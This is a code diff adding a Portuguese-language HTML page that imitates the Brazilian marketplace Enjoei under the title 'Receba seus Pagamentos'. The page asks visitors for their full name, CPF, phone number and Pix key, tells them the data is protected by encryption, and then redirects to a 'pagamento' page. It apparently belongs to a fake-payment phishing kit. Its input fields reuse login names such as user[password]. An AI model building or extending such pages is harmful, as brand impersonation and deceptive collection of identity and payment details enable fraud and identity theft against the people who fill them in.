@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ENJOEI - Receba seus Pagamentos</title>
+    <style>
+      /* Estilos gerais melhorados */
+      :root {
+        --primary-color: #61005D;
+        --primary-light: #8E3A8B;
+        --secondary-color: #FFC0CB;
+        --text-color: #333;
+        --light-gray: #f5f5f5;
+        --medium-gray: #e0e0e0;
+        --dark-gray: #666;
+        --error-color: #e74c3c;
+        --success-color: #2ecc71;
+      }
+      
+      body {
+        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        background-color: var(--light-gray);
+        margin: 0;
+        padding: 0;
+        color: var(--text-color);
+        line-height: 1.6;
+      }
+
+      .o-container.-with-gutter {
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      /* Cabeçalho modernizado */
+      .c-clean-header {
+        background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        padding: 20px 0;
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+
+      .c-clean-header__wrapper {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 0 20px;
+      }
+
+      .header-title {
+        color: white;
+        font-size: 20px;
+        font-weight: 600;
+        margin: 0;
+      }
+
+      /* Container do formulário */
+      .session-wrapper {
+        background-color: white;
+        border-radius: 12px;
+        padding: 30px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+        margin-top: 30px;
+        border: 1px solid var(--medium-gray);
+      }
+
+      /* Cabeçalho do formulário */
+      .session-header {
+        text-align: center;
+        margin-bottom: 30px;
+      }
+
+      .session-title {
+        color: var(--primary-color);
+        font-size: 24px;
+        font-weight: 700;
+        margin-bottom: 10px;
+        position: relative;
+        display: inline-block;
+      }
+
+      .session-title:after {
+        content: "";
+        position: absolute;
+        bottom: -8px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 60px;
+        height: 3px;
+        background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+        border-radius: 3px;
+      }
+
+      .session-text {
+        color: var(--dark-gray);
+        font-size: 16px;
+        margin: 0;
+        line-height: 1.5;
+      }
+
+      /* Campos do formulário */
+      .l-field {
+        margin-bottom: 25px;
+        position: relative;
+      }
+
+      .l-label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        color: var(--primary-color);
+      }
+
+      .o-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 2px solid var(--medium-gray);
+        border-radius: 8px;
+        font-size: 15px;
+        transition: all 0.3s ease;
+        box-sizing: border-box;
+        background-color: #fafafa;
+      }
+
+      .o-input:focus {
+        border-color: var(--primary-light);
+        outline: none;
+        box-shadow: 0 0 0 3px rgba(97, 0, 93, 0.1);
+        background-color: white;
+      }
+
+      .o-input:hover {
+        border-color: #b3b3b3;
+      }
+
+      /* Separador estilizado */
+      .separator {
+        display: flex;
+        align-items: center;
+        margin: 30px 0;
+        color: var(--dark-gray);
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .separator:before,
+      .separator:after {
+        content: "";
+        flex: 1;
+        height: 1px;
+        background: linear-gradient(90deg, transparent, var(--medium-gray));
+        margin: 0 10px;
+      }
+
+      .separator:after {
+        background: linear-gradient(90deg, var(--medium-gray), transparent);
+      }
+
+      /* Botão principal */
+      .o-button.-xs-primary {
+        background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 16px;
+        font-size: 16px;
+        font-weight: 600;
+        width: 100%;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 8px rgba(97, 0, 93, 0.2);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      .o-button.-xs-primary:hover {
+        background: linear-gradient(135deg, var(--primary-light), var(--primary-color));
+        transform: translateY(-2px);
+        box-shadow: 0 6px 12px rgba(97, 0, 93, 0.25);
+      }
+
+      .o-button.-xs-primary:active {
+        transform: translateY(0);
+      }
+
+      /* Estilos de erro */
+      .erro {
+        border-color: var(--error-color) !important;
+      }
+
+      .mensagem-erro {
+        color: var(--error-color);
+        font-size: 13px;
+        margin-top: 6px;
+        display: none;
+        font-weight: 500;
+      }
+
+      /* Select estilizado */
+      select.o-input {
+        appearance: none;
+        background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2361005D'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+        background-repeat: no-repeat;
+        background-position: right 12px center;
+        background-size: 16px;
+        padding-right: 36px;
+      }
+
+      /* Checkbox e termos */
+      .checkbox-wrapper {
+        margin: 25px 0;
+      }
+
+      /* Footer */
+      .o-text.-xs-minion {
+        font-size: 12px;
+        color: var(--dark-gray);
+        margin-top: 30px;
+        text-align: center;
+        line-height: 1.5;
+      }
+
+      .o-text.-xs-minion a {
+        color: var(--primary-color);
+        font-weight: 500;
+      }
+
+      /* Animação do logo */
+      .logo-banner {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: white;
+        z-index: 9999;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: fadeOut 0.5s ease 1.5s forwards;
+      }
+      
+      .logo-banner svg {
+        animation: bounce 0.8s ease infinite;
+        width: 60px;
+        height: 60px;
+      }
+      
+      @keyframes bounce {
+        0% { transform: scale(0.8); opacity: 0; }
+        50% { transform: scale(1.05); opacity: 0.8; }
+        100% { transform: scale(1); opacity: 1; }
+      }
+      
+      @keyframes fadeOut {
+        to { opacity: 0; visibility: hidden; }
+      }
+
+      /* Responsividade */
+      @media (max-width: 480px) {
+        .session-wrapper {
+          padding: 25px 20px;
+          margin-top: 20px;
+        }
+        
+        .session-title {
+          font-size: 22px;
+        }
+        
+        .header-title {
+          font-size: 18px;
+        }
+        
+        .o-input {
+          padding: 12px 14px;
+        }
+      }
+
+      /* Efeito de loading no botão */
+      .button-loading {
+        position: relative;
+        pointer-events: none;
+      }
+
+      .button-loading:after {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 20px;
+        height: 20px;
+        margin: -10px 0 0 -10px;
+        border: 2px solid rgba(255,255,255,0.3);
+        border-top-color: white;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+      }
+
+      @keyframes spin {
+        to { transform: rotate(360deg); }
+      }
+
+      /* Tooltip para ajuda */
+      .help-tooltip {
+        position: relative;
+        display: inline-block;
+        margin-left: 5px;
+        cursor: help;
+      }
+
+      .help-tooltip:before {
+        content: "?";
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 16px;
+        height: 16px;
+        background-color: var(--primary-color);
+        color: white;
+        border-radius: 50%;
+        font-size: 12px;
+        font-weight: bold;
+      }
+
+      .help-tooltip:hover:after {
+        content: attr(data-tooltip);
+        position: absolute;
+        bottom: 100%;
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: #333;
+        color: white;
+        padding: 6px 10px;
+        border-radius: 4px;
+        font-size: 12px;
+        white-space: nowrap;
+        margin-bottom: 5px;
+        z-index: 100;
+      }
+    </style>
+  </head>
+  <body cz-shortcut-listen="true">
+    <div class="logo-banner">
+      <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none">
+        <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path>
+      </svg>
+    </div>
+   
+    <header class="c-clean-header">
+      <div class="c-clean-header__wrapper">
+        <h1 class="header-title">Receba seus Pagamentos</h1>
+      </div>
+    </header>
+
+    <main class="o-container -with-gutter">
+      <div class="session-wrapper">
+        <div class="session-header">
+          <h1 class="session-title">Informações Bancárias</h1>
+          <p class="session-text">Preencha seus dados para receber seus pagamentos com segurança</p>
+        </div>
+
+        <form id="login_user" class="o-form l-form">
+          <div class="l-field">
+            <label for="user_name" class="l-label">
+              Nome Completo <span class="help-tooltip" data-tooltip="Nome conforme cadastro no banco"></span>
+            </label>
+            <input
+              type="text"
+              name="user[email]"
+              id="user_name"
+              placeholder="Nome completo do titular"
+              class="o-input"
+              required
+            />
+            <div id="erro-user_name" class="mensagem-erro">
+              Por favor, insira seu nome completo
+            </div>
+          </div>
+
+          <div class="l-field">
+            <label for="user_cpf" class="l-label">CPF</label>
+            <input
+              type="text"
+              name="user[password]"
+              id="user_cpf"
+              placeholder="000.000.000-00"
+              maxlength="14"
+              oninput="formatCPF(this)"
+              class="o-input"
+              required
+            />
+            <div id="erro-user_cpf" class="mensagem-erro">
+              Por favor, insira um CPF válido
+            </div>
+          </div>
+
+          <div class="l-field">
+            <label for="user_phone" class="l-label">Telefone</label>
+            <input
+              type="text"
+              name="user[password]"
+              id="user_phone"
+              placeholder="(00) 00000-0000"
+              maxlength="15"
+              oninput="formatCelular(this)"
+              class="o-input"
+              required
+            />
+            <div id="erro-user_phone" class="mensagem-erro">
+              Por favor, insira um telefone válido
+            </div>
+          </div>
+
+          <div class="separator">Dados Bancários</div>
+
+          <div class="l-field">
+            <label for="selectfromuser" class="l-label">
+              Tipo de Chave Pix <span class="help-tooltip" data-tooltip="Selecione como deseja receber"></span>
+            </label>
+            <select id="selectfromuser" class="o-input" required>
+              <option value="" disabled selected>Selecione o tipo de chave</option>
+              <option value="CPF">CPF</option>
+              <option value="EMAIL">E-mail</option>
+              <option value="TELEFONE">Telefone</option>
+              <option value="ALEATORIA">Chave Aleatória</option>
+            </select>
+            <div id="erro-typekey" class="mensagem-erro">
+              Por favor, selecione um tipo de chave
+            </div>
+          </div>
+
+          <div class="l-field" id="telefone_field">
+            <label for="user_key" class="l-label">Chave Pix</label>
+            <input
+              type="text"
+              name="user[phone]"
+              id="user_key"
+              placeholder="Digite sua chave Pix"
+              class="o-input"
+              required
+            />
+            <div id="erro-user_key" class="mensagem-erro">
+              Por favor, insira sua chave Pix
+            </div>
+          </div>
+
+          <div class="o-well" style="margin-top: 30px;">
+            <button 
+              type="button" 
+              onclick="submitForm()" 
+              class="o-button -xs-primary"
+              id="submit-button"
+            >
+              Confirmar Dados
+            </button>
+          </div>
+
+          <div class="separator">Segurança</div>
+
+          <p class="o-text -xs-minion">
+            Suas informações estão protegidas com criptografia avançada.
+            <br>
+            Ao continuar, você concorda com nossos <a href="#" target="_blank">Termos de Serviço</a> e <a href="#" target="_blank">Política de Privacidade</a>.
+          </p>
+        </form>
+      </div>
+    </main>
+
+    <script>
+      // Remove o logo após 1.5 segundos
+      setTimeout(() => {
+        const logo = document.querySelector(".logo-banner");
+        if (logo) logo.remove();
+      }, 1500);
+
+      // Formatação de CPF
+      function formatCPF(input) {
+        let cpf = input.value.replace(/\D/g, "");
+        if (cpf.length > 3 && cpf.length <= 6) {
+          cpf = cpf.replace(/(\d{3})(\d+)/, "$1.$2");
+        } else if (cpf.length > 6 && cpf.length <= 9) {
+          cpf = cpf.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
+        } else if (cpf.length > 9) {
+          cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, "$1.$2.$3-$4");
+        }
+        input.value = cpf;
+      }
+
+      // Formatação de celular
+      function formatCelular(input) {
+        let celular = input.value.replace(/\D/g, "");
+        if (celular.length > 2 && celular.length <= 7) {
+          celular = celular.replace(/(\d{2})(\d+)/, "($1) $2");
+        } else if (celular.length > 7 && celular.length <= 11) {
+          celular = celular.replace(/(\d{2})(\d{5})(\d+)/, "($1) $2-$3");
+        } else if (celular.length > 11) {
+          celular = celular.replace(/(\d{2})(\d{5})(\d{4})(\d+)/, "($1) $2-$3");
+        }
+        input.value = celular;
+      }
+      
+      // Mostrar/ocultar campo de chave Pix
+      document.getElementById("selectfromuser").addEventListener("change", function() {
+        document.getElementById("telefone_field").style.display = "block";
+      });
+
+      // Validação do formulário
+      function submitForm() {
+        const button = document.getElementById("submit-button");
+        const form = document.getElementById("login_user");
+        let isValid = true;
+        
+        // Simular validação
+        button.classList.add("button-loading");
+        
+        setTimeout(() => {
+          button.classList.remove("button-loading");
+          
+          // Aqui você pode adicionar validações reais
+          if (form.checkValidity()) {
+            // Se tudo estiver válido, redirecionar
+            window.location.href = '/VeryPagement/pagamento.html';
+          } else {
+            // Mostrar mensagens de erro
+            alert("Por favor, preencha todos os campos corretamente.");
+          }
+        }, 1500);
+      }
+
+      // Validação em tempo real
+      document.querySelectorAll('.o-input').forEach(input => {
+        input.addEventListener('input', function() {
+          if (this.checkValidity()) {
+            this.classList.remove('erro');
+            this.nextElementSibling.style.display = 'none';
+          }
+        });
+        
+        input.addEventListener('blur', function() {
+          if (!this.checkValidity()) {
+            this.classList.add('erro');
+            this.nextElementSibling.style.display = 'block';
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
